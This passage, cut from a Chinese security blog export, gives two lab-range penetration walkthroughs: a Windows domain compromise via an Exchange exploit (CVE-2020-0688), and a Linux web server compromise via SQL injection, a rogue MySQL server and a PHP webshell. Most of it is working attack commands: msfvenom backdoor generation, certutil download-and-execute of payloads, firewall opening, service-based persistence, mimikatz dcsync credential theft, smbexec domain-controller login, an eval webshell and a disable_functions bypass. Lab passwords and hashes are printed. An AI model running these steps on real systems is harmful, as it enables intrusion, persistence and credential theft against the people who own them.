title=\"4.7Antsword连接shell\"></a>4.7Antsword连接shell</h2><p>使用中国蚁剑设置代理之后进行连接</p>\n<p><img src=\"ZxlAwG648ghrGEajzs1dDylbos71_EnGRKm8Y3_jf8w.png\" alt=\"image\"></p>\n<h2 id=\"4-8信息收集-redis-服务器信息\"><a href=\"#4-8信息收集-redis-服务器信息\" class=\"headerlink\" title=\"4.8信息收集 redis 服务器信息\"></a>4.8信息收集 redis 服务器信息</h2><p>查看当前权限，发现权限比较低，我们可以尝试提权</p>\n<p><img src=\"KUoCTQMzXVDw7CG94ilpIJlkt4Bbd8txzEhh00i4pxo.png\" alt=\"image\"></p>\n<h2 id=\"4-9-PrintSpoofer-提权-server2012\"><a href=\"#4-9-PrintSpoofer-提权-server2012\" class=\"headerlink\" title=\"4.9 PrintSpoofer 提权 server2012\"></a>4.9 PrintSpoofer 提权 server2012</h2><p>上传提权工具printspoofer到目标，提权成功</p>\n<p><img src=\"wPB2Ny1hovQtcAL4yI-wgYELSW61ATF31jX4FqdzzsQ.png\" alt=\"image\"></p>\n<h2 id=\"4-10-下载-metasploist-正向后门收集信息\"><a href=\"#4-10-下载-metasploist-正向后门收集信息\" class=\"headerlink\" title=\"4.10 下载 metasploist 正向后门收集信息\"></a>4.10 下载 metasploist 正向后门收集信息</h2><p>因为 reids 主机是出不了网的 所以要将后门放在宝塔上的 80 端口，同样也要过火绒。</p>\n<p>使用msf生成一个正向连接的木马，上传至目标机器</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/x64/meterpreter/bind_tcp lport=7799 -f exe &gt;m.exe</span><br></pre></td></tr></table></figure>\n<p><img src=\"qDNyM7bZY3oiFuh99YFgjn5lKx4LQGWeZOCBxjYADSU.png\" alt=\"image\"></p>\n<p><img src=\"Dojs9fAX1oiKwZA33eA9YldAE0ipwVcXUaSaGLZhrEA.png\" alt=\"image\"></p>\n<h2 id=\"4-11设置-windwos-防火墙开放7799\"><a href=\"#4-11设置-windwos-防火墙开放7799\" class=\"headerlink\" title=\"4.11设置 windwos 防火墙开放7799\"></a>4.11设置 windwos 防火墙开放7799</h2><p>因为有防火墙拦截，所以先添加一个7799的端口</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">garck.exe -i -c <span class=\"string\">&quot;netsh firewall add portopening tcp 7799 msf&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"3NJ5sUSTCX-3Yf-L7Sh4mOchyRit-dGaYArhqjUs56k.png\" alt=\"image\"></p>\n<h2 id=\"4-12-设置服务方式启动后门\"><a href=\"#4-12-设置服务方式启动后门\" class=\"headerlink\" title=\"4.12 设置服务方式启动后门\"></a>4.12 设置服务方式启动后门</h2><p>注意双引号转义 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">moonsec.exe -i -c <span class=\"string\">&quot;sc create \\&quot;server power\\&quot; binpath= \\&quot;C:\\ProgramData\\8899.exe&quot;</span><span class=\"string\">&quot; </span></span><br><span class=\"line\"><span class=\"string\">moonsec.exe -i -c &quot;</span>sc description \\&quot;server power\\&quot; \\&quot;description\\&quot;<span class=\"string\">&quot; </span></span><br><span class=\"line\"><span class=\"string\">moonsec.exe -i -c &quot;</span>sc config \\&quot;server power\\&quot; start= auto<span class=\"string\">&quot; </span></span><br><span class=\"line\"><span class=\"string\">启动后门 moonsec.exe -i -c &quot;</span>net start \\&quot;server power\\&quot;<span class=\"string\">&quot;</span></span><br></pre></td></tr></table></figure>\n<p>在目标运行木马</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">garck.exe -i -c <span class=\"string\">&quot;c:\\gongju\\m.exe&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"YlthWSjnMHJ9dDRUiRSUjZ1gWmNjT9Gl8q6q6iK5iKo.png\" alt=\"image\"></p>\n<p>开启监听</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">background</span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\"><span class=\"built_in\">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class=\"line\"><span class=\"built_in\">set</span> rhost 192.168.88.4</span><br><span class=\"line\"><span class=\"built_in\">set</span> lport 7799</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p><img src=\"zBLPXNEoXMzV_YHfEhvUblXq9YDdevBZbq-BmXvt0uQ.png\" alt=\"image\"></p>\n<p>看到了其它网段的IP：10.10.10.202</p>\n<p><img src=\"u4hcHw_9LdONLzD3_CwwsAVuW51Z7SDjRk6mARypo7E.png\" alt=\"image\"></p>\n<p>进行arp扫描这个网段，总是扫描断开，我们添加路由使用nmap去扫描</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run arp_scanner -r 10.10.10.0/24</span><br></pre></td></tr></table></figure>\n<p><img src=\"MhCFi05OMMLXDZ4fkGl2g2I24ZUk39lgq-x8s9GkOw0.png\" alt=\"image\"></p>\n<p>添加路由</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run autoroute -s 10.10.10.0/24</span><br></pre></td></tr></table></figure>\n<p><img src=\"IQ5ha4OhwlSTwnff34nqM28ci_FYBvdnx1XTArpfO-g.png\" alt=\"image\"></p>\n<p>根据80端口去探测存活的主机</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains nmap -sT -Pn 10.10.10.0/24 -p 80</span><br></pre></td></tr></table></figure>\n<p><img src=\"sPDJf0lOpAXAtrjAlkO0u8gUhyfEt-5vPf5vmdBcBJc.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains nmap -sT -Pn 10.10.10.209 10.10.10.201 -p 53,443,80,445,135</span><br></pre></td></tr></table></figure>\n<p><img src=\"DJHAMM2yvxk-5KR41yUBo0_5QEukeOSsD4D-Z-gGT_o.png\" alt=\"image\"></p>\n<p><img src=\"zpBEpsIDZDTFpyNInOi9ZNKxgCSJ7O0sK4xOUUjU2CM.png\" alt=\"image\"></p>\n<p>发现了exchang服务</p>\n<p><img src=\"TWerXBKwxGclAzOViFgQ5EARikHjkagTMzrbTamwmuU.png\" alt=\"image\"></p>\n<h2 id=\"4-13-outlook-查看邮件\"><a href=\"#4-13-outlook-查看邮件\" class=\"headerlink\" title=\"4.13. outlook 查看邮件\"></a>4.13. outlook 查看邮件</h2><p>搜索文件pst</p>\n<p><img src=\"UpZigZMlUvnvgxQLLwPSTjbq2h6bN-PRc_DLfYUrADM.png\" alt=\"image\"></p>\n<p>下载到本地</p>\n<p>安装相关软件之后，进行查看邮件的内容</p>\n<p><img src=\"7OJ66D5aoE9nlSPEbkborhC50m-CccBS3wOjev7jxjA.png\" alt=\"image\"></p>\n<p><img src=\"8EWV7Oy1rzty-ErD94L6Xs917FlpYdRB3cQ428e8XkU.png\" alt=\"image\"></p>\n<h1 id=\"5-跨网段渗透\"><a href=\"#5-跨网段渗透\" class=\"headerlink\" title=\"5.跨网段渗透\"></a>5.跨网段渗透</h1><p>登录成功，查看所有的用户</p>\n<p><img src=\"umt1wiDhLp8VKoO_iP1A8JmnKZyq4f6zy4MsW08yiPc.jpeg\" alt=\"image\"></p>\n<p> </p>\n<p>复制之前生成的正向连接木马到web目录</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">copy <span class=\"string\">&quot;C:\\gongju\\m.exe&quot;</span> <span class=\"string\">&quot;C:\\inetpub\\wwwroot&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"3QFQMOaLcjXbbS0Mu-zELGRaJHztxr_2_uIAHCzeNpM.png\" alt=\"image\"></p>\n<h2 id=\"5-1CVE-2020-0688-攻击-exchange\"><a href=\"#5-1CVE-2020-0688-攻击-exchange\" class=\"headerlink\" title=\"5.1CVE-2020-0688 攻击 exchange\"></a>5.1CVE-2020-0688 攻击 exchange</h2><p>下载后门文件到 exchange </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">CVE-2020-0688_EXP.py -s https://10.10.10.209 -u cncat\\moonsec -p QQqq5201314 -c <span class=\"string\">&quot;cmd /c certutil -urlcache -split -f http://10.10.10.202/4444.exe c:/4444.exe</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"pwUdAp7rhPQ2-Cq-D184H5tarpHSJCVeS9nlYrx-6mg.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">CVE-2020-0688_EXP.py -s https://10.10.10.209 -u cncat\\moonsec -p QQqq5201314 -c <span class=\"string\">&quot;cmd /c certutil -urlcache -split -f http://10.10.10.202/m.exe c:/m.exe&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"KImh1Vk0fGEQMDr4V3Jjfgo5kl0iKt1P1urjEmdrR_M.png\" alt=\"image\"></p>\n<p>打开7799防火墙</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">CVE-2020-0688_EXP.py -s https://10.10.10.209 -u cncat\\moonsec -p QQqq5201314 -c <span class=\"string\">&quot;cmd /c netsh firewall add portopening tcp 7799 msf&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"rytRq6bsCl2ZVFCOmoq0ePz7n2QLjJD6Hp35ToBIFiY.png\" alt=\"image\"></p>\n<p>执行木马程序</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">CVE-2020-0688_EXP.py -s https://10.10.10.209 -u cncat\\moonsec -p QQqq5201314 -c <span class=\"string\">&quot;cmd /c c:/m.exe&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"QfkT2jMdMLQv0dZTtoTZ8L8gkLs4Y64txhCtoVRQChM.png\" alt=\"image\"></p>\n<p>成功上线</p>\n<p><img src=\"E05DINd7CXGEyVM-h6ovnzoCtMiWFRxPYeg5rZbaObk.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run enum_logged_on_users -l</span><br></pre></td></tr></table></figure>\n<p><img src=\"YL2tZA3-u6nw4fbPq9luPZIYDlyksFVOo4bXLBfCgys.png\" alt=\"image\"></p>\n<p>查看域控</p>\n<p><img src=\"O71C2TNQmh0TFdSwrD6RdRby-PhECui6DelCydRGmMA.png\" alt=\"image\"></p>\n<p>查看域控IP</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">ping 12server-dc.cncat.cc</span><br></pre></td></tr></table></figure>\n<p><img src=\"89F4bZ2VRg6-hJRUJuZJDqv8UcbHWmgK_0ZzweVndiI.png\" alt=\"image\"></p>\n<p>查看工作组的信息</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">net config workstation</span><br></pre></td></tr></table></figure>\n<p><img src=\"h-YvXnGJ-kyXWV_hA7A8pmyCwZjqxkaXWmGiMmmq43g.png\" alt=\"image\"></p>\n<p>收集域用户</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">net user /domain</span><br></pre></td></tr></table></figure>\n<p><img src=\"z_jIU-CS45h0LZgnDvvz5-gz_-vL79qrP1FH3Xwh02o.png\" alt=\"image\"></p>\n<p>查看进程，把进程迁移到域管理员用户的进程中</p>\n<p><img src=\"aFKKQjLeYCEtoAA1ACZEhqqW0orhdI_L07FhWyx9uX4.png\" alt=\"image\"></p>\n<p>查看权限：getuid</p>\n<p><img src=\"x6NtmjH-zhd4PoXQi3uTPIMJaic-gQ-BKy01KISpB2o.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">dir</span> \\\\10.10.10.201\\c$</span><br></pre></td></tr></table></figure>\n<p><img src=\"Rf_8HM7vOauGj-JE-b7xKrQ9k5gxnb_6k4hCeogj3N8.png\" alt=\"image\"></p>\n<h2 id=\"5-2mimikatz读取密码\"><a href=\"#5-2mimikatz读取密码\" class=\"headerlink\" title=\"5.2mimikatz读取密码\"></a>5.2mimikatz读取密码</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">load mimikatz</span><br><span class=\"line\">dcsync cncat\\administrator</span><br><span class=\"line\">dcsync cncat</span><br></pre></td></tr></table></figure>\n<p><img src=\"nbkzym6LzCTap0aFh12HAn__dt84AL_J0thYxFHa-w8.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">dcsync_ntlm administrator</span><br><span class=\"line\">dcsync administrator</span><br></pre></td></tr></table></figure>\n<p><img src=\"MqXaH965T3I1Y6u7Ow5H5S3Zg-Mh1EjAqf1PvG1Qki0.png\" alt=\"image\"></p>\n<p>破解哈希值</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Hash: 42e2656ec24331269f82160ff5962387</span><br></pre></td></tr></table></figure>\n<p><img src=\"ge4aTrzPMX9Ktr9BK6H9lJiAupWO70oJCnNkVLWinhg.png\" alt=\"image\"></p>\n<h2 id=\"5-3通过-smbexec-登录域控制器\"><a href=\"#5-3通过-smbexec-登录域控制器\" class=\"headerlink\" title=\"5.3通过 smbexec 登录域控制器\"></a>5.3通过 smbexec 登录域控制器</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains python3 smbexec.py cncat/administrator:QWEasd123@10.10.10.201</span><br></pre></td></tr></table></figure>\n<p><img src=\"U43jb_dGWkyFLniUkNwJYwElj9PWB9X7RnIFDHT7Uog.png\" alt=\"image\"></p>\n<p><img src=\"wXB8zmMjxcB7q-LRvyHaJArH2_BnNgjqsK9K48I9u9w.png\" alt=\"image\"></p>\n","categories":["打靶日记（moon）"],"tags":["红队","域渗透","打点"]},{"title":"打靶日记（二）linux内网完整渗透测试","url":"/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","content":"<h1 id=\"打靶日记（二）linux内网完整渗透测试\"><a href=\"#打靶日记（二）linux内网完整渗透测试\" class=\"headerlink\" title=\"打靶日记（二）linux内网完整渗透测试\"></a>打靶日记（二）linux内网完整渗透测试</h1><p><strong>声明：此系列文章系个人记录打靶过程的文章，靶场为暗月师傅的靶场。这是第二篇。</strong></p>\n<h1 id=\"1-DDD4-靶场介绍\"><a href=\"#1-DDD4-靶场介绍\" class=\"headerlink\" title=\"1. DDD4 靶场介绍\"></a>1. DDD4 靶场介绍</h1><p>本靶场存在三个 flag 把下载到的虚拟机环境导入到虚拟机，本靶场需要把网络环境配置好。 </p>\n<p>1.1.网络示意图</p>\n<p><img src=\"aLiwvcp-UzbIWInlTkDoGYq9TK-5N3btQDHc_xgKO1w.png\" alt=\"image\"></p>\n<h1 id=\"2-信息收集\"><a href=\"#2-信息收集\" class=\"headerlink\" title=\"2.信息收集\"></a>2.信息收集</h1><h2 id=\"2-1主机发现\"><a href=\"#2-1主机发现\" class=\"headerlink\" title=\"2.1主机发现\"></a>2.1主机发现</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">netdiscover -i eth0 -r 192.168.1.0/24</span><br></pre></td></tr></table></figure>\n<p><img src=\"boBeKNPQXMu535jEiekVmfNc7LZuqTiSTkNSQFXXZeA.png\" alt=\"image\"></p>\n<h2 id=\"2-2端口探测\"><a href=\"#2-2端口探测\" class=\"headerlink\" title=\"2.2端口探测\"></a>2.2端口探测</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">masscan -p 1-65535 192.168.1.122  --rate=10000</span><br></pre></td></tr></table></figure>\n<p><img src=\"5H-2EXhyD2qNM-eJXM53TTM8wYuaSAmHg-t_6eUnJs8.png\" alt=\"image\"></p>\n<h2 id=\"2-3-nmap-端口信息获取\"><a href=\"#2-3-nmap-端口信息获取\" class=\"headerlink\" title=\"2.3.nmap 端口信息获取\"></a>2.3.nmap 端口信息获取</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">nmap -sC -p 3306,80,8888,21,888 -A 192.168.1.122 -oA ddd4-port</span><br></pre></td></tr></table></figure>\n<p><img src=\"RFW8U9nOZltCzcATzIvXdG_-dVCQUTH7yoeCchV9t3Y.png\" alt=\"image\"></p>\n<h2 id=\"2-4gobuser-的高级用法\"><a href=\"#2-4gobuser-的高级用法\" class=\"headerlink\" title=\"2.4gobuser 的高级用法\"></a>2.4gobuser 的高级用法</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">gobuster <span class=\"built_in\">dir</span> -u http://www.ddd4.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x <span class=\"string\">&#x27;php,zip,html,rar&#x27;</span> -o ddd4.log --wildcard -l | grep -v 10430 | grep -v <span class=\"string\">&quot;Size: 49&quot;</span></span><br></pre></td></tr></table></figure>\n\n\n<h1 id=\"3-对目标进行渗透测试\"><a href=\"#3-对目标进行渗透测试\" class=\"headerlink\" title=\"3. 对目标进行渗透测试\"></a>3. 对目标进行渗透测试</h1><h2 id=\"3-1sqlmap编码注入利用\"><a href=\"#3-1sqlmap编码注入利用\" class=\"headerlink\" title=\"3.1sqlmap编码注入利用\"></a>3.1sqlmap编码注入利用</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlmap -u http://www.ddd4.com/search?keyword=11 --tamper chardoubleencode.py -v 1 --batch -p keyword</span><br></pre></td></tr></table></figure>\n<p><img src=\"-gmtIITLfqy6oedfzCeYkCyHOSKkbRu_LFmIPK73Nio.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlmap -u http://www.ddd4.com/search?keyword=11 --tamper chardoubleencode.py -v 1 --batch -p keyword -D www_ddd4_com --dump -T doc_user</span><br></pre></td></tr></table></figure>\n<p><img src=\"-M4rBTSEL-uPNKbmLkhLMYijp8M6bc_TVJr11biX-tY.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">webadmin </span><br><span class=\"line\">admin 33e2q1yc3d033e22aesyc2140aec3l850c3a99s21232f297uj57a5a7438n4a0ex4a801yc3d0</span><br></pre></td></tr></table></figure>\n<p>明文是加密的解不开的</p>\n<p> </p>\n<h2 id=\"3-2-MYSQL-服务器恶意读取客户端文件漏洞利用\"><a href=\"#3-2-MYSQL-服务器恶意读取客户端文件漏洞利用\" class=\"headerlink\" title=\"3.2.MYSQL 服务器恶意读取客户端文件漏洞利用\"></a>3.2.MYSQL 服务器恶意读取客户端文件漏洞利用</h2><p>Rogue-MySql-Server 读取文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://github.com/allyshka/Rogue-MySql-Server </span><br><span class=\"line\">vim rogue_mysql_server.py</span><br></pre></td></tr></table></figure>\n<p><img src=\"mD5soiazKv4Yvy31b_rIouCW4Sv4bNpULxrF9zVMCWY.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.ddd4.com/setup/checkdb.php?dbname=mysql&amp;<span class=\"built_in\">uname</span>=root&amp;<span class=\"built_in\">pwd</span>=123456&amp;dbhost=192.168.8.133&amp;action=chkdb</span><br></pre></td></tr></table></figure>\n<p>获取报错路径</p>\n<p><img src=\"i46MwEx32hMzuVSb9ehAkPdqiSITd4tWL1XcjT_i_Ho.png\" alt=\"image\"></p>\n<p>获取 &#x2F;etc&#x2F;passwd 内网</p>\n<p><img src=\"N5eGpHcKw2O_hQ0XNM5MLw5zw1zfm97Wh5PJZgEZg90.png\" alt=\"image\"></p>\n<h2 id=\"3-3-Rogue-MySql-Server-读取配置文件\"><a href=\"#3-3-Rogue-MySql-Server-读取配置文件\" class=\"headerlink\" title=\"3.3.Rogue-MySql-Server 读取配置文件\"></a>3.3.Rogue-MySql-Server 读取配置文件</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">/www/wwwroot/www.ddd4.com/config/doc-config-cn.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"lNcOugDegwk8TFfCv3f_Yjs2B-pmV9PIE0PNMO5wIE4.png\" alt=\"image\"></p>\n<p><img src=\"ZPceR2i3tUi9g_PcS7Rmo95NbRUoVhbNdQ44Sbfwy0M.png\" alt=\"image\"></p>\n<p>得到数据库连接文件 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">dbname www_ddd4_com </span><br><span class=\"line\">username www_ddd4_com </span><br><span class=\"line\">password x4ix6ZrM7b8nFYHn</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"3-4登录-mysql\"><a href=\"#3-4登录-mysql\" class=\"headerlink\" title=\"3.4登录 mysql\"></a>3.4登录 mysql</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">mysql -h192.168.8.122 -uwww_ddd4_com -px4ix6ZrM7b8nFYHn</span><br></pre></td></tr></table></figure>\n<p><img src=\"vZzK91Arz0BeMnJ04XYhpne_qM_dfWjue6kVUCdM_9w.png\" alt=\"image\"></p>\n<h2 id=\"3-5后台密文登录\"><a href=\"#3-5后台密文登录\" class=\"headerlink\" title=\"3.5后台密文登录\"></a>3.5后台密文登录</h2><p>密文不能直接破解，只能替换登录登录之后再替换回来，修改程序生成密文 admin 的明文为 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">33e2q1yc3d033e22aesyc2140aec3l850c3a99s21232f297uj57a5a7438n4a0ex4a80 1yc3d0</span><br></pre></td></tr></table></figure>\n<p>数据库修改密文 </p>\n<p>原来的密文</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">33e2q1yc3d033e22aesyc2140aec3l850c3a99s21232f297uj57a5a7438n4a0ex4a801yc3d0</span><br></pre></td></tr></table></figure>\n\n\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">show databases;</span><br><span class=\"line\">use www_ddd4_com</span><br><span class=\"line\">update doc_user <span class=\"built_in\">set</span> <span class=\"built_in\">pwd</span></span><br><span class=\"line\">=<span class=\"string\">&#x27;33e2q1yc3d033e22aesyc2140aec3l850c3a99s21232f297uj57a5a7438n4a0ex4a801yc3d0&#x27;</span> <span class=\"built_in\">where</span> <span class=\"built_in\">id</span>=1;</span><br></pre></td></tr></table></figure>\n<p><img src=\"pKHTqWdUA3FzqVUgU_EZIPwIaKyk6O4hlqQbL3qvaZ4.png\" alt=\"image\"></p>\n<p><a href=\"http://www.ddd4.com/admini/login.php\">http://www.ddd4.com/admini/login.php</a></p>\n<p>admin admin</p>\n<p>成功登录后台。</p>\n<p><img src=\"cHL0rT91Xe3NnduVVq1FMoZAYw0ccWtRxAM16OWU_Fg.png\" alt=\"image\"></p>\n<p> </p>\n<h2 id=\"3-6后台上传漏洞\"><a href=\"#3-6后台上传漏洞\" class=\"headerlink\" title=\"3.6后台上传漏洞\"></a>3.6后台上传漏洞</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">admini\\controllers\\system\\bakup.php </span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"function\"><span class=\"title\">uploadsql</span></span>() &#123; global <span class=\"variable\">$request</span>; <span class=\"variable\">$uploadfile</span>=<span class=\"built_in\">basename</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;uploadfile&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]); <span class=\"keyword\">if</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;userfile&#x27;</span>][<span class=\"string\">&#x27;size&#x27;</span>]&gt;<span class=\"variable\">$request</span>[<span class=\"string\">&#x27;max_file_size&#x27;</span>]) <span class=\"built_in\">echo</span> <span class=\"string\">&#x27;alert(&quot; 您 上 传 的 文 件 超 出 了 2M 的 限 制!&quot;);window.history.go(-1);&#x27;</span>; <span class=\"keyword\">if</span>(fileext(<span class=\"variable\">$uploadfile</span>)!=<span class=\"string\">&#x27;sql&#x27;</span>) <span class=\"built_in\">echo</span> <span class=\"string\">&#x27;alert(&quot; 只 允 许 上 传 sql 格 式 文 件!&quot;);window.history.go(-1);&#x27;</span>; <span class=\"variable\">$savepath</span> = ABSPATH.<span class=\"string\">&#x27;/temp/data/&#x27;</span>.<span class=\"variable\">$uploadfile</span>; 暗月内部培训资料 <span class=\"keyword\">if</span>(move_uploaded_file(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;uploadfile&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>], <span class=\"variable\">$savepath</span>)) &#123; <span class=\"built_in\">echo</span> <span class=\"string\">&#x27;alert(&quot; 数 据 库 SQL 脚 本 文 件 上 传 成 功!&quot;);window.history.go(-1);&#x27;</span>; &#125; <span class=\"keyword\">else</span> &#123; <span class=\"built_in\">echo</span> <span class=\"string\">&#x27;alert(&quot; 数 据 库 SQL 脚 本 文 件 上 传 失 败!&quot;);window.history.go(-1);&#x27;</span>; &#125; &#125; </span><br></pre></td></tr></table></figure>\n<p>存在逻辑问题 上传 SQL 判断没有退出 导致可上传任何文件 数据包</p>\n<h2 id=\"3-7模板编辑拿-webshell\"><a href=\"#3-7模板编辑拿-webshell\" class=\"headerlink\" title=\"3.7模板编辑拿 webshell\"></a>3.7模板编辑拿 webshell</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php <span class=\"built_in\">eval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"zWne8qc5UOMBbCgsoOpTYxud8SnCa2FZay1OhRUyR_o.png\" alt=\"image\"></p>\n<p>输入之后，直接按下ctrl+s即可“编辑成功”</p>\n<p>验证是否可用，访问首页，给其进行传参</p>\n<p><img src=\"unEb45ar18BfZxfrxuiLnjZ9TuWUgc3T2D1C7U4O5dE.png\" alt=\"image\"></p>\n<p>使用中国菜刀连接</p>\n<p><img src=\"wYCa0DExRxHN5CZl4z4l96rqJtoSHCaNxnnOY0Y-420.png\" alt=\"image\"></p>\n<p> </p>\n<h1 id=\"4-Linux权限提升\"><a href=\"#4-Linux权限提升\" class=\"headerlink\" title=\"4.Linux权限提升\"></a>4.Linux权限提升</h1><h2 id=\"4-1突破-disable-functions-提权\"><a href=\"#4-1突破-disable-functions-提权\" class=\"headerlink\" title=\"4.1突破 disable_functions 提权\"></a>4.1突破 disable_functions 提权</h2><p>这套新系统的宝塔系统 php 禁止很多函数的执行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">passthru,<span class=\"built_in\">exec</span>,system,<span class=\"built_in\">chroot</span>,<span class=\"built_in\">chgrp</span>,<span class=\"built_in\">chown</span>,shell_exec,popen,proc_open,pcntl_exec,ini_alter,i</span><br><span class=\"line\">ni_restore,dl,openlog,syslog,<span class=\"built_in\">readlink</span>,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_w</span><br><span class=\"line\">aitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pc</span><br><span class=\"line\">ntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get</span><br><span class=\"line\">_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exe</span><br><span class=\"line\">c,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv</span><br></pre></td></tr></table></figure>\n<p>有些版本还是漏了一些函数可以执行</p>\n<p>查看网卡信息</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.ddd4.com/bypass_disablefunc.php?cmd=ifconfig&amp;outpath=/tmp/xx&amp;sopath=/www/wwwroot/www.ddd4.com/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>\n<p><img src=\"HeHSpFKheKKmk0B-bpZtwRaXoMY2JnGCJGSJTJ7e6zA.png\" alt=\"image\"></p>\n<p>反弹shell失败</p>\n<p><img src=\"0eaTAy2xU59Xo3PGG-qnPJQw8FhbawWvP5-n8I0GOwg.png\" alt=\"image\"></p>\n<h2 id=\"4-2-metasploit-反弹-shell\"><a href=\"#4-2-metasploit-反弹-shell\" class=\"headerlink\" title=\"4.2.metasploit 反弹 shell\"></a>4.2.metasploit 反弹 shell</h2><h3 id=\"4-2-1-生成攻击载荷\"><a href=\"#4-2-1-生成攻击载荷\" class=\"headerlink\" title=\"4.2.1.生成攻击载荷\"></a>4.2.1.生成攻击载荷</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.8.133 LPORT=13777 -f elf &gt;/root/moonsec/2020/project5/ddd4</span><br></pre></td></tr></table></figure>\n<p><img src=\"lFgRqW__tTnM9orNPitddsi8owUqK_bBQz5rXctEPps.png\" alt=\"image\"></p>\n<h3 id=\"4-2-2监听端口\"><a href=\"#4-2-2监听端口\" class=\"headerlink\" title=\"4.2.2监听端口\"></a>4.2.2监听端口</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Msfconsole</span><br><span class=\"line\">use 